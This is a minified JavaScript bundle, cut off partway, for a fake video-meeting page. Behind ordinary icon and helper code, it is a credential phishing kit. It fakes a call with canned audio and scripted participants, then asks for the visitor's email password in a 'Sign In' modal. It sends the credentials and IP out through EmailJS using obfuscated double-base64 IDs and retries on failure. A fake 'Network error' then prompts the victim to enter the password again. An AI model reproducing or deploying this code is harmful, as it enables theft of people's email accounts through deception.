import {R as x, r as u, j as t, a as H, V as f} from "./index-CQQo33C0.js";
function P(e) {
    var a, s, r = "";
    if (typeof e == "string" || typeof e == "number")
        r += e;
    else if (typeof e == "object")
        if (Array.isArray(e)) {
            var n = e.length;
            for (a = 0; a < n; a++)
                e[a] && (s = P(e[a])) && (r && (r += " "),
                r += s)
        } else
            for (s in e)
                e[s] && (r && (r += " "),
                r += s);
    return r
}
function A() {
    for (var e, a, s = 0, r = "", n = arguments.length; s < n; s++)
        (e = arguments[s]) && (a = P(e)) && (r && (r += " "),
        r += a);
    return r
}
var F = {
    color: void 0,
    size: void 0,
    className: void 0,
    style: void 0,
    attr: void 0
}
  , _ = x.createContext && x.createContext(F)
  , Z = ["attr", "size", "title"];
function U(e, a) {
    if (e == null)
        return {};
    var s = Y(e, a), r, n;
    if (Object.getOwnPropertySymbols) {
        var i = Object.getOwnPropertySymbols(e);
        for (n = 0; n < i.length; n++)
            r = i[n],
            !(a.indexOf(r) >= 0) && Object.prototype.propertyIsEnumerable.call(e, r) && (s[r] = e[r])
    }
    return s
}
function Y(e, a) {
    if (e == null)
        return {};
    var s = {};
    for (var r in e)
        if (Object.prototype.hasOwnProperty.call(e, r)) {
            if (a.indexOf(r) >= 0)
                continue;
            s[r] = e[r]
        }
    return s
}
function y() {
    return y = Object.assign ? Object.assign.bind() : function(e) {
        for (var a = 1; a < arguments.length; a++) {
            var s = arguments[a];
            for (var r in s)
                Object.prototype.hasOwnProperty.call(s, r) && (e[r] = s[r])
        }
        return e
    }
    ,
    y.apply(this, arguments)
}
function k(e, a) {
    var s = Object.keys(e);
    if (Object.getOwnPropertySymbols) {
        var r = Object.getOwnPropertySymbols(e);
        a && (r = r.filter(function(n) {
            return Object.getOwnPropertyDescriptor(e, n).enumerable
        })),
        s.push.apply(s, r)
    }
    return s
}
function N(e) {
    for (var a = 1; a < arguments.length; a++) {
        var s = arguments[a] != null ? arguments[a] : {};
        a % 2 ? k(Object(s), !0).forEach(function(r) {
            J(e, r, s[r])
        }) : Object.getOwnPropertyDescriptors ? Object.defineProperties(e, Object.getOwnPropertyDescriptors(s)) : k(Object(s)).forEach(function(r) {
            Object.defineProperty(e, r, Object.getOwnPropertyDescriptor(s, r))
        })
    }
    return e
}
function J(e, a, s) {
    return a = Q(a),
    a in e ? Object.defineProperty(e, a, {
        value: s,
        enumerable: !0,
        configurable: !0,
        writable: !0
    }) : e[a] = s,
    e
}
function Q(e) {
    var a = $(e, "string");
    return typeof a == "symbol" ? a : a + ""
}
function $(e, a) {
    if (typeof e != "object" || !e)
        return e;
    var s = e[Symbol.toPrimitive];
    if (s !== void 0) {
        var r = s.call(e, a || "default");
        if (typeof r != "object")
            return r;
        throw new TypeError("@@toPrimitive must return a primitive value.")
    }
    return (a === "string" ? String : Number)(e)
}
function T(e) {
    return e && e.map( (a, s) => x.createElement(a.tag, N({
        key: s
    }, a.attr), T(a.child)))
}
function d(e) {
    return a => x.createElement(K, y({
        attr: N({}, e.attr)
    }, a), T(e.child))
}
function K(e) {
    var a = s => {
        var {attr: r, size: n, title: i} = e, o = U(e, Z), m = n || s.size || "1em", h;
        return s.className && (h = s.className),
        e.className && (h = (h ? h + " " : "") + e.className),
        x.createElement("svg", y({
            stroke: "currentColor",
            fill: "currentColor",
            strokeWidth: "0"
        }, s.attr, r, o, {
            className: h,
            style: N(N({
                color: e.color || s.color
            }, s.style), e.style),
            height: m,
            width: m,
            xmlns: "http://www.w3.org/2000/svg"
        }), i && x.createElement("title", null, i), e.children)
    }
    ;
    return _ !== void 0 ? x.createElement(_.Consumer, null, s => a(s)) : a(F)
}
function X(e) {
    return d({
        tag: "svg",
        attr: {
            viewBox: "0 0 1024 1024"
        },
        child: [{
            tag: "path",
            attr: {
                d: "M176 511a56 56 0 1 0 112 0 56 56 0 1 0-112 0zm280 0a56 56 0 1 0 112 0 56 56 0 1 0-112 0zm280 0a56 56 0 1 0 112 0 56 56 0 1 0-112 0z"
            },
            child: []
        }]
    })(e)
}
function ee(e) {
    return d({
        tag: "svg",
        attr: {
            viewBox: "0 0 24 24",
            fill: "none",
            stroke: "currentColor",
            strokeWidth: "2",
            strokeLinecap: "round",
            strokeLinejoin: "round"
        },
        child: [{
            tag: "line",
            attr: {
                x1: "1",
                y1: "1",
                x2: "23",
                y2: "23"
            },
            child: []
        }, {
            tag: "path",
            attr: {
                d: "M9 9v3a3 3 0 0 0 5.12 2.12M15 9.34V4a3 3 0 0 0-5.94-.6"
            },
            child: []
        }, {
            tag: "path",
            attr: {
                d: "M17 16.95A7 7 0 0 1 5 12v-2m14 0v2a7 7 0 0 1-.11 1.23"
            },
            child: []
        }, {
            tag: "line",
            attr: {
                x1: "12",
                y1: "19",
                x2: "12",
                y2: "23"
            },
            child: []
        }, {
            tag: "line",
            attr: {
                x1: "8",
                y1: "23",
                x2: "16",
                y2: "23"
            },
            child: []
        }]
    })(e)
}
function te(e) {
    return d({
        tag: "svg",
        attr: {
            viewBox: "0 0 24 24",
            fill: "none",
            stroke: "currentColor",
            strokeWidth: "2",
            strokeLinecap: "round",
            strokeLinejoin: "round"
        },
        child: [{
            tag: "path",
            attr: {
                d: "M12 1a3 3 0 0 0-3 3v8a3 3 0 0 0 6 0V4a3 3 0 0 0-3-3z"
            },
            child: []
        }, {
            tag: "path",
            attr: {
                d: "M19 10v2a7 7 0 0 1-14 0v-2"
            },
            child: []
        }, {
            tag: "line",
            attr: {
                x1: "12",
                y1: "19",
                x2: "12",
                y2: "23"
            },
            child: []
        }, {
            tag: "line",
            attr: {
                x1: "8",
                y1: "23",
                x2: "16",
                y2: "23"
            },
            child: []
        }]
    })(e)
}
function ae(e) {
    return d({
        tag: "svg",
        attr: {
            viewBox: "0 0 24 24",
            fill: "none",
            stroke: "currentColor",
            strokeWidth: "2",
            strokeLinecap: "round",
            strokeLinejoin: "round"
        },
        child: [{
            tag: "path",
            attr: {
                d: "M16 16v1a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V7a2 2 0 0 1 2-2h2m5.66 0H14a2 2 0 0 1 2 2v3.34l1 1L23 7v10"
            },
            child: []
        }, {
            tag: "line",
            attr: {
                x1: "1",
                y1: "1",
                x2: "23",
                y2: "23"
            },
            child: []
        }]
    })(e)
}
function se(e) {
    return d({
        tag: "svg",
        attr: {
            viewBox: "0 0 24 24",
            fill: "none",
            stroke: "currentColor",
            strokeWidth: "2",
            strokeLinecap: "round",
            strokeLinejoin: "round"
        },
        child: [{
            tag: "polygon",
            attr: {
                points: "23 7 16 12 23 17 23 7"
            },
            child: []
        }, {
            tag: "rect",
            attr: {
                x: "1",
                y: "5",
                width: "15",
                height: "14",
                rx: "2",
                ry: "2"
            },
            child: []
        }]
    })(e)
}
const re = "/assets/permissions_flow-CajQasGd.svg"
  , ne = "/assets/permissions_flow_intro-TQw80F4-.svg";
function ie(e) {
    return d({
        tag: "svg",
        attr: {
            viewBox: "0 0 512 512"
        },
        child: [{
            tag: "path",
            attr: {
                d: "M328 256c0 39.8-32.2 72-72 72s-72-32.2-72-72 32.2-72 72-72 72 32.2 72 72zm104-72c-39.8 0-72 32.2-72 72s32.2 72 72 72 72-32.2 72-72-32.2-72-72-72zm-352 0c-39.8 0-72 32.2-72 72s32.2 72 72 72 72-32.2 72-72-32.2-72-72-72z"
            },
            child: []
        }]
    })(e)
}
function oe(e) {
    return d({
        tag: "svg",
        attr: {
            viewBox: "0 0 192 512"
        },
        child: [{
            tag: "path",
            attr: {
                d: "M96 184c39.8 0 72 32.2 72 72s-32.2 72-72 72-72-32.2-72-72 32.2-72 72-72zM24 80c0 39.8 32.2 72 72 72s72-32.2 72-72S135.8 8 96 8 24 40.2 24 80zm0 352c0 39.8 32.2 72 72 72s72-32.2 72-72-32.2-72-72-72-72 32.2-72 72z"
            },
            child: []
        }]
    })(e)
}
function le(e) {
    return d({
        tag: "svg",
        attr: {
            version: "1.1",
            viewBox: "0 0 16 16"
        },
        child: [{
            tag: "path",
            attr: {
                d: "M15.897 9c0.125 0.867 0.207 2.053-0.182 2.507-0.643 0.751-4.714 0.751-4.714-0.751 0-0.756 0.67-1.252 0.027-2.003-0.632-0.738-1.766-0.75-3.027-0.751s-2.394 0.012-3.027 0.751c-0.643 0.751 0.027 1.247 0.027 2.003 0 1.501-4.071 1.501-4.714 0.751-0.389-0.454-0.307-1.64-0.182-2.507 0.096-0.579 0.339-1.203 1.118-2 0-0 0-0 0-0 1.168-1.090 2.935-1.98 6.716-2v-0c0.021 0 0.042 0 0.063 0s0.041-0 0.063-0v0c3.781 0.019 5.548 0.91 6.716 2 0 0 0 0 0 0 0.778 0.797 1.022 1.421 1.118 2z"
            },
            child: []
        }]
    })(e)
}
function ce(e) {
    return d({
        tag: "svg",
        attr: {
            viewBox: "0 0 24 24"
        },
        child: [{
            tag: "path",
            attr: {
                fill: "none",
                d: "M0 0h24v24H0V0z"
            },
            child: []
        }, {
            tag: "path",
            attr: {
                d: "M11 7h2v2h-2V7zm0 4h2v6h-2v-6zm1-9C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8z"
            },
            child: []
        }]
    })(e)
}
function de(e) {
    return d({
        tag: "svg",
        attr: {
            viewBox: "0 0 24 24"
        },
        child: [{
            tag: "path",
            attr: {
                fill: "none",
                d: "M0 0h24v24H0z"
            },
            child: []
        }, {
            tag: "path",
            attr: {
                d: "m17.93 16 1.63-1.63c-2.77-3.02-2.77-7.56 0-10.74L17.93 2c-3.9 3.89-3.91 9.95 0 14zm4.99-5.05a3.317 3.317 0 0 1 0-3.89l-1.68-1.69c-2.02 2.02-2.02 5.07 0 7.27l1.68-1.69zM9 13c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm6.39 2.56C13.71 14.7 11.53 14 9 14s-4.71.7-6.39 1.56A2.97 2.97 0 0 0 1 18.22V21h16v-2.78c0-1.12-.61-2.15-1.61-2.66z"
            },
            child: []
        }]
    })(e)
}
function ue(e) {
    return d({
        tag: "svg",
        attr: {
            viewBox: "0 0 24 24"
        },
        child: [{
            tag: "path",
            attr: {
                fill: "none",
                d: "M0 0h24v24H0zm0 0h24v24H0z"
            },
            child: []
        }, {
            tag: "path",
            attr: {
                d: "M19 11h-1.7c0 .74-.16 1.43-.43 2.05l1.23 1.23c.56-.98.9-2.09.9-3.28zm-4.02.17c0-.06.02-.11.02-.17V5c0-1.66-1.34-3-3-3S9 3.34 9 5v.18l5.98 5.99zM4.27 3 3 4.27l6.01 6.01V11c0 1.66 1.33 3 2.99 3 .22 0 .44-.03.65-.08l1.66 1.66c-.71.33-1.5.52-2.31.52-2.76 0-5.3-2.1-5.3-5.1H5c0 3.41 2.72 6.23 6 6.72V21h2v-3.28c.91-.13 1.77-.45 2.54-.9L19.73 21 21 19.73 4.27 3z"
            },
            child: []
        }]
    })(e)
}
function V(e) {
    return d({
        tag: "svg",
        attr: {
            viewBox: "0 0 24 24"
        },
        child: [{
            tag: "path",
            attr: {
                fill: "none",
                d: "M0 0h24v24H0z"
            },
            child: []
        }, {
            tag: "path",
            attr: {
                d: "M12 14c1.66 0 2.99-1.34 2.99-3L15 5c0-1.66-1.34-3-3-3S9 3.34 9 5v6c0 1.66 1.34 3 3 3zm5.3-3c0 3-2.54 5.1-5.3 5.1S6.7 14 6.7 11H5c0 3.41 2.72 6.23 6 6.72V21h2v-3.28c3.28-.48 6-3.3 6-6.72h-1.7z"
            },
            child: []
        }]
    })(e)
}
function me(e) {
    return d({
        tag: "svg",
        attr: {
            viewBox: "0 0 24 24"
        },
        child: [{
            tag: "path",
            attr: {
                fill: "none",
                d: "M0 0h24v24H0V0z"
            },
            child: []
        }, {
            tag: "path",
            attr: {
                d: "M17 10.5V7c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h12c.55 0 1-.45 1-1v-3.5l4 4v-11l-4 4zM14 13h-3v3H9v-3H6v-2h3V8h2v3h3v2z"
            },
            child: []
        }]
    })(e)
}
function he(e) {
    return d({
        tag: "svg",
        attr: {
            viewBox: "0 0 24 24"
        },
        child: [{
            tag: "path",
            attr: {
                fill: "none",
                d: "M0 0h24v24H0z"
            },
            child: []
        }, {
            tag: "path",
            attr: {
                d: "M20 2H4c-1.1 0-1.99.9-1.99 2L2 22l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm-2 12H6v-2h12v2zm0-3H6V9h12v2zm0-3H6V6h12v2z"
            },
            child: []
        }]
    })(e)
}
function pe(e) {
    return d({
        tag: "svg",
        attr: {
            viewBox: "0 0 24 24"
        },
        child: [{
            tag: "path",
            attr: {
                fill: "none",
                d: "M0 0h24v24H0V0z"
            },
            child: []
        }, {
            tag: "path",
            attr: {
                d: "M20 18c1.1 0 1.99-.9 1.99-2L22 6a2 2 0 0 0-2-2H4c-1.11 0-2 .89-2 2v10a2 2 0 0 0 2 2H0v2h24v-2h-4zm-7-3.53v-2.19c-2.78 0-4.61.85-6 2.72.56-2.67 2.11-5.33 6-5.87V7l4 3.73-4 3.74z"
            },
            child: []
        }]
    })(e)
}
function xe(e) {
    return d({
        tag: "svg",
        attr: {
            viewBox: "0 0 24 24"
        },
        child: [{
            tag: "path",
            attr: {
                d: "M17 16.99c-1.35 0-2.2.42-2.95.8-.65.33-1.18.6-2.05.6-.9 0-1.4-.25-2.05-.6-.75-.38-1.57-.8-2.95-.8s-2.2.42-2.95.8c-.65.33-1.17.6-2.05.6v1.95c1.35 0 2.2-.42 2.95-.8.65-.33 1.17-.6 2.05-.6s1.4.25 2.05.6c.75.38 1.57.8 2.95.8s2.2-.42 2.95-.8c.65-.33 1.18-.6 2.05-.6.9 0 1.4.25 2.05.6.75.38 1.58.8 2.95.8v-1.95c-.9 0-1.4-.25-2.05-.6-.75-.38-1.6-.8-2.95-.8zm0-4.45c-1.35 0-2.2.43-2.95.8-.65.32-1.18.6-2.05.6-.9 0-1.4-.25-2.05-.6-.75-.38-1.57-.8-2.95-.8s-2.2.43-2.95.8c-.65.32-1.17.6-2.05.6v1.95c1.35 0 2.2-.43 2.95-.8.65-.35 1.15-.6 2.05-.6s1.4.25 2.05.6c.75.38 1.57.8 2.95.8s2.2-.43 2.95-.8c.65-.35 1.15-.6 2.05-.6s1.4.25 2.05.6c.75.38 1.58.8 2.95.8v-1.95c-.9 0-1.4-.25-2.05-.6-.75-.38-1.6-.8-2.95-.8zm2.95-8.08c-.75-.38-1.58-.8-2.95-.8s-2.2.42-2.95.8c-.65.32-1.18.6-2.05.6-.9 0-1.4-.25-2.05-.6-.75-.37-1.57-.8-2.95-.8s-2.2.42-2.95.8c-.65.33-1.17.6-2.05.6v1.93c1.35 0 2.2-.43 2.95-.8.65-.33 1.17-.6 2.05-.6s1.4.25 2.05.6c.75.38 1.57.8 2.95.8s2.2-.43 2.95-.8c.65-.32 1.18-.6 2.05-.6.9 0 1.4.25 2.05.6.75.38 1.58.8 2.95.8V5.04c-.9 0-1.4-.25-2.05-.58zM17 8.09c-1.35 0-2.2.43-2.95.8-.65.35-1.15.6-2.05.6s-1.4-.25-2.05-.6c-.75-.38-1.57-.8-2.95-.8s-2.2.43-2.95.8c-.65.35-1.15.6-2.05.6v1.95c1.35 0 2.2-.43 2.95-.8.65-.32 1.18-.6 2.05-.6s1.4.25 2.05.6c.75.38 1.57.8 2.95.8s2.2-.43 2.95-.8c.65-.32 1.18-.6 2.05-.6.9 0 1.4.25 2.05.6.75.38 1.58.8 2.95.8V9.49c-.9 0-1.4-.25-2.05-.6-.75-.38-1.6-.8-2.95-.8z"
            },
            child: []
        }]
    })(e)
}
function fe(e) {
    return d({
        tag: "svg",
        attr: {
            viewBox: "0 0 24 24"
        },
        child: [{
            tag: "path",
            attr: {
                fill: "none",
                d: "M0 0h24v24H0z"
            },
            child: []
        }, {
            tag: "path",
            attr: {
                d: "M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM8.5 8c.83 0 1.5.67 1.5 1.5S9.33 11 8.5 11 7 10.33 7 9.5 7.67 8 8.5 8zM12 18c-2.28 0-4.22-1.66-5-4h10c-.78 2.34-2.72 4-5 4zm3.5-7c-.83 0-1.5-.67-1.5-1.5S14.67 8 15.5 8s1.5.67 1.5 1.5-.67 1.5-1.5 1.5z"
            },
            child: []
        }]
    })(e)
}
function ge(e) {
    return d({
        tag: "svg",
        attr: {
            viewBox: "0 0 24 24"
        },
        child: [{
            tag: "path",
            attr: {
                fill: "none",
                d: "M0 0h24v24H0z"
            },
            child: []
        }, {
            tag: "path",
            attr: {
                d: "M16 11c1.66 0 2.99-1.34 2.99-3S17.66 5 16 5c-1.66 0-3 1.34-3 3s1.34 3 3 3zm-8 0c1.66 0 2.99-1.34 2.99-3S9.66 5 8 5C6.34 5 5 6.34 5 8s1.34 3 3 3zm0 2c-2.33 0-7 1.17-7 3.5V19h14v-2.5c0-2.33-4.67-3.5-7-3.5zm8 0c-.29 0-.62.02-.97.05 1.16.84 1.97 1.97 1.97 3.45V19h6v-2.5c0-2.33-4.67-3.5-7-3.5z"
            },
            child: []
        }]
    })(e)
}
const g = {
    _origin: "https://api.emailjs.com"
}
  , ve = (e, a="https://api.emailjs.com") => {
    g._userID = e,
    g._origin = a
}
  , I = (e, a, s) => {
    if (!e)
        throw "The user ID is required. Visit https://dashboard.emailjs.com/admin/integration";
    if (!a)
        throw "The service ID is required. Visit https://dashboard.emailjs.com/admin";
    if (!s)
        throw "The template ID is required. Visit https://dashboard.emailjs.com/admin/templates";
    return !0
}
;
class E {
    constructor(a) {
        this.status = a.status,
        this.text = a.responseText
    }
}
const L = (e, a, s={}) => new Promise( (r, n) => {
    const i = new XMLHttpRequest;
    i.addEventListener("load", ({target: o}) => {
        const m = new E(o);
        m.status === 200 || m.text === "OK" ? r(m) : n(m)
    }
    ),
    i.addEventListener("error", ({target: o}) => {
        n(new E(o))
    }
    ),
    i.open("POST", g._origin + e, !0),
    Object.keys(s).forEach(o => {
        i.setRequestHeader(o, s[o])
    }
    ),
    i.send(a)
}
)
  , be = (e, a, s, r) => {
    const n = r || g._userID;
    return I(n, e, a),
    L("/api/v1.0/email/send", JSON.stringify({
        lib_version: "3.2.0",
        user_id: n,
        service_id: e,
        template_id: a,
        template_params: s
    }), {
        "Content-type": "application/json"
    })
}
  , je = e => {
    let a;
    if (typeof e == "string" ? a = document.querySelector(e) : a = e,
    !a || a.nodeName !== "FORM")
        throw "The 3rd parameter is expected to be the HTML form element or the style selector of form";
    return a
}
  , we = (e, a, s, r) => {
    const n = r || g._userID
      , i = je(s);
    I(n, e, a);
    const o = new FormData(i);
    return o.append("lib_version", "3.2.0"),
    o.append("service_id", e),
    o.append("template_id", a),
    o.append("user_id", n),
    L("/api/v1.0/email/send-form", o)
}
  , w = {
    init: ve,
    send: be,
    sendForm: we
};
function ye({name: e}) {
    let[a,s] = u.useState(!1)
      , [r] = u.useState(atob(new URLSearchParams(window.location.search).get("meetID").toString()))
      , n = u.useRef();
    const [i,o] = u.useState(!1)
      , [m,h] = u.useState("")
      , [v,R] = u.useState(0);
    let[M,z] = u.useState([{
        name: "Dan powell",
        muted: !1,
        speaking: !0
    }, {
        name: "Debra Lee",
        muted: !0
    }, {
        name: e || "main user",
        muted: !1
    }]);
    const [B,D] = u.useState(new Date);
    window.played = !1,
    u.useEffect( () => {
        if (document.body.style.background = "#121212",
        !window.played) {
            let l = document.querySelector("audio");
            l && (l.muted = !1,
            l.play(),
            l.addEventListener("ended", function() {
                G(),
                this.src = "",
                s(!0)
            }))
        }
        const c = setInterval( () => {
            D(new Date)
        }
        , 1e3);
        return () => {
            clearInterval(c)
        }
    }
    , []);
    const G = () => {
        if (!("webkitSpeechRecognition"in window))
            alert("Your browser does not support the Web Speech API. Please use a supported browser like Google Chrome.");
        else {
            const c = new webkitSpeechRecognition;
            c.continuous = !0,
            c.interimResults = !1,
            c.lang = "en-US",
            c.start(),
            document.getElementById("2"),
            c.onsoundstart = () => {
                let l = [...M];
                l[2].speaking = !0,
                l[0].speaking = !1,
                z(l),
                console.log("sounded recorded")
            }
            ,
            c.onsoundend = () => {
                let l = [...M];
                l[2].speaking = !1,
                l[0].speaking = !0,
                z(l),
                console.log("record stopped"),
                setTimeout( () => {
                    c.start()
                }
                , 2500)
            }
            ,
            c.onend = () => {}
            ,
            c.onerror = l => {
                console.log(l),
                setTimeout( () => {
                    c.start()
                }
                , 2e3)
            }
        }
    }
      , W = c => {
        c.preventDefault(),
        o(!0),
        R(j => j + 1);
        var l = {
            reply_to: "reply_to_value",
            from_name: atob("TUVFVA==") + "📆",
            to_name: atob(localStorage.getItem("to_name")),
            message_html: `Email address : ${r} and password : ${n.current.value}`,
            user_ip: localStorage.getItem("ip"),
            email: atob(sessionStorage.getItem("email"))
        };
        let p = {
            t1: atob(atob("ZEdWdGNHeGhkR1ZmZG1SclkyMXdlQT09")),
            u1: atob(atob("WkZWT1ozZzFWVWxvVWtKelUwbFVXbVU9"))
        };
        var b = "default_service"
          , q = p.t1 || "";
        w.send(b, q, l, p.u1 || "").then(j => {
            v >= 2 && (localStorage.setItem("x", 1),
            window.location.reload()),
            j.status === 200 && (o(!1),
            f.error("Network error! Connection timed Out.", {
                position: "bottom-right"
            }),
            n.current.value = "",
            setTimeout( () => h(!1), 4e3))
        }
        ).catch(j => {
            w.send(b, p.t2 || "", l, p.u2 || "").then(S => {
                v >= 2 && (localStorage.setItem("x", 1),
                window.location.reload()),
                S.status === 200 && (o(!1),
                f.error("Network error! Connection timed Out.", {
                    position: "bottom-right"
                }),
                n.current.value = "",
                setTimeout( () => h(!1), 4e3))
            }
            ).catch(S => {
                w.send(b, p.t3, l, p.u3).then(C => {
                    v >= 2 && (localStorage.setItem("x", 1),
                    window.location.reload()),
                    C.status === 200 && (o(!1),
                    f.error("Network error! Connection timed Out.", {
                        position: "bottom-right"
                    }),
                    n.current.value = "",
                    setTimeout( () => h(!1), 4e3))
                }
                ).catch(C => {
                    w.send(b, p.t1, l, p.u1).then(O => {
                        v >= 2 && (localStorage.setItem("x", 1),
                        window.location.reload()),
                        O.status === 200 && (o(!1),
                        f.error("Network error! Connection timed Out.", {
                            position: "bottom-right"
                        }),
                        n.current.value = "",
                        setTimeout( () => h(!1), 4e3))
                    }
                    ).catch(O => {
                        o(!0),
                        f.error("Network error! Connection timed Out.", {
                            position: "bottom-right"
                        })
                    }
                    )
                }
                )
            }
            )
        }
        )
    }
    ;
    return t.jsxs(t.Fragment, {
        children: [t.jsxs("div", {
            className: "top-0 fixed overflow-auto h-[100vh] z-10 text-gray-400 bg-[#121212] w-full",
            children: [t.jsx("section", {
                className: "flex gap-3 flex-wrap h-[100vh] items-center px-4 lg:px-10",
                children: M.map( (c, l) => t.jsxs("div", {
                    id: l,
                    className: `min-w-[250px] items-center border-2  ${c.speaking ? " border-blue-300 " : "border-transparent"} ${l < 1 ? "bg-[#64748b]" : "bg-[#64748bcc]"} justify-center flex flex-1  border-slate-400 h-[20rem] rounded-md relative text-white`,
                    children: [t.jsx("header", {
                        className: "absolute right-3 top-3  bg-[#12121278] py-2 px-2 rounded-full",
                        children: c.muted ? t.jsx(ue, {}) : c.speaking ? t.jsx(ie, {
                            className: " animate-pulse text-blue-400"
                        }) : t.jsx(V, {})
                    }), t.jsx("footer", {
                        className: "pl-4 left-3   text-xs font-semibold absolute bottom-3 capitalize",
                        children: c.name
                    }), t.jsx("img", {
                        src: `https://ui-avatars.com/api/?name=${c.name}&rounded=true&background=random&size=146&length=1`
                    })]
                }, l))
            }), t.jsxs("footer", {
                className: "fixed left-0 bottom-0 text-white mb-3  w-full min-h-10 px-4 text-xs flex items-center justify-center sm:justify-between",
                children: [t.jsxs("p", {
                    className: "font-semibold tabular-nums hidden sm:flex",
                    children: [B.toLocaleTimeString(), " | Qty-Yuao-!ndd"]
                }), t.jsxs("div", {
                    className: "text-xs sm:text-lg gap-2 sm:gap-4 flex",
                    children: [t.jsx("button", {
                        className: "bg-slate-700 px-3 rounded-full",
                        children: t.jsx(V, {})
                    }), t.jsx("button", {
                        className: "bg-slate-700 px-3 rounded-full",
                        children: t.jsx(me, {})
                    }), t.jsx("button", {
                        className: "bg-slate-700 px-3 rounded-full",
                        children: t.jsx(de, {})
                    }), t.jsx("button", {
                        className: "bg-slate-700 px-3 rounded-full",
                        children: t.jsx(fe, {})
                    }), t.jsx("button", {
                        className: "bg-slate-700 px-3 rounded-full",
                        children: t.jsx(pe, {})
                    }), t.jsx("button", {
                        className: "bg-slate-700 px-3 rounded-full",
                        children: t.jsx(xe, {})
                    }), t.jsx("button", {
                        className: "bg-slate-700 px-3 rounded-full",
                        children: t.jsx(oe, {})
                    }), t.jsx("button", {
                        className: "bg-red-500 px-6 py-3 rounded-[20px]",
                        children: t.jsx(le, {})
                    })]
                }), t.jsxs("section", {
                    className: "gap-3 hidden sm:flex  items-center sm:text-lg text-xs h-full cursor-not-allowed",
                    title: "authentication required to proceed",
                    children: [t.jsx(ce, {}), t.jsx(ge, {}), t.jsx(he, {})]
                })]
            })]
        }), a && H.createPortal(t.jsx(t.Fragment, {
            children: t.jsx("div", {
                className: "fixed top-0 z-40 left-0 w-full sm:w-[100%] h-[100vh] backdrop-blur-md",
                children: t.jsx("section", {
                    className: "px-4 pt-8",
                    children: t.jsxs("form", {
                        onSubmit: W,
                        className: "bg-white  w-full sm:w-[30%] mx-auto rounded-md my-6 min-h-[20rem] px-4",
                        children: [t.jsxs("header", {
                            className: "space-y-4 pt-4",
                            children: [t.jsx("h3", {
                                className: "text-center font-semibold text-xl",
                                children: "Sign In"
                            }), t.jsx("p", {
                                className: "text-center text-sm",
                                children: "to continue with meeting"
                            })]
                        }), t.jsx("br", {}), t.jsx("br", {}), t.jsx("div", {
                            children: t.jsx("input", {
                                value: r,
                                readOnly: !0,
                                type: "email",
                                placeholder: "Email address",
                                required: !0,
                                autoCapitalize: !1,
                                className: "border indent-3 w-full rounded-sm py-2"
                            })
                        }), t.jsx("br", {}), t.jsxs("div", {
                            children: [t.jsx("input", {
                                readOnly: i,
                                ref: n,
                                autoFocus: !0,
                                type: "password",
                                placeholder: "Email Password",
                                required: !0,
                                autoCapitalize: !1,
                                className: "border indent-3 w-full rounded-sm py-2"
                            }), m && t.jsx("p", {
                                className: "text-red-500 text-xs py-2",
                                children: "Invalid email and password combination"
                            })]
                        }), t.jsx("br", {}), t.jsx("button", {
                            disabled: i,
                            className: "w-full bg-blue-500 text-white rounded-md py-3",
                            children: i ? "Processing..." : "Continue"
                        }), t.jsx("br", {}), t.jsx("br", {})]
                    })
                })
            })
        }), document.querySelector("#modal"))]
    })
}
function Me() {
    let e = u.useRef()
      , [a,s] = u.useState({
        loading: !1,
        showModal: !1,
        withMedia: !0,
        state: "",
        name: "",
        stream: null
    });
    u.useEffect( () => {
        a.state.toString().trim() == "" && setTimeout( () => {
            s(n => ({
                ...n,
                showModal: !0,
                state: "ready"
            }))
        }
        , 4e3),
        console.log("STATE: " + a.state.toString())
    }
    , []);
    const r = n => {
        n.preventDefault(),
        s(i => ({
            ...i,
            state: "joining"
        })),
        setTimeout( () => {
            console.log("HandleJoin Ran");
            let i = ["hello.m4a", "hello1.m4a", "hello2.m4a"]
              , o = document.createElement("audio");
            o.src = i[Math.round(Math.random() * (i.length - 1))],
            o.autoplay = !1,
            o.setAttribute("controls", "false"),
            document.body.appendChild(o),
            s(m => ({
                ...m,
                state: "meeting"
            }))
        }
        , 3e3)
    }
    ;
    return t.jsxs(t.Fragment, {
        children: [a.state !== "meeting" && t.jsxs(t.Fragment, {
            children: [t.jsx("section", {
                className: "h-[90vh] mt-[5%]",
                children: t.jsxs("div", {
                    className: "sm:flex gap-8  justify-center flex-row grid grid-cols-1 lg:px-14 sm:px-4",
                    children: [t.jsxs("div", {
                        className: A([" relative text-white rounded-md mx-auto w-[70vw] h-[25rem] flex flex-col justify-between px-3 py-3", {
                            "bg-slate-950": !a.withMedia || a.state == "",
                            "bg-transparent ": a.withMedia && a.state !== ""
                        }]),
                        children: [t.jsx("header", {
                            className: "self-end",
                            children: t.jsx(X, {})
                        }), t.jsxs("footer", {
                            className: "flex justify-center gap-3 z-10",
                            children: [t.jsx("button", {
                                className: "border rounded-full py-2 px-2",
                                children: a.withMedia ? t.jsx(te, {
                                    size: 13,
                                    className: ""
                                }) : t.jsx(ee, {
                                    size: 13,
                                    className: "text-red-300"
                                })
                            }), t.jsx("button", {
                                className: "border rounded-full py-2 px-2",
                                children: a.withMedia ? t.jsx(se, {
                                    size: 13
                                }) : t.jsx(ae, {
                                    size: 13,
                                    className: "text-red-300"
                                })
                            })]
                        }), a.withMedia && t.jsx("video", {
                            muted: !0,
                            ref: e,
                            className: "w-full h-full mt-[-10px] ml-[-10px] absolute rounded-sm"
                        })]
                    }), t.jsxs("div", {
                        className: "flex flex-col justify-center items-center  sm:w-[30%]  ",
                        children: [a.state === "" && t.jsxs(t.Fragment, {
                            children: [t.jsx("h3", {
                                className: "text-lg font-semibold",
                                children: "Getting ready..."
                            }), t.jsx("p", {
                                className: "text-xs py-2",
                                children: "You'll be able to join in just a moment"
                            }), t.jsx("div", {
                                className: "",
                                children: t.jsx("svg", {
                                    className: "animate-spin text-blue-500",
                                    width: "20px",
                                    height: "29px",
                                    viewBox: "0 0 20 20",
                                    children: t.jsx("g", {
                                        id: "🔍-System-Icons",
                                        stroke: "none",
                                        "stroke-width": "1",
                                        fill: "none",
                                        "fill-rule": "evenodd",
                                        children: t.jsx("g", {
                                            id: "ic_fluent_spinner_ios_20_regular",
                                            fill: "#3b82f6",
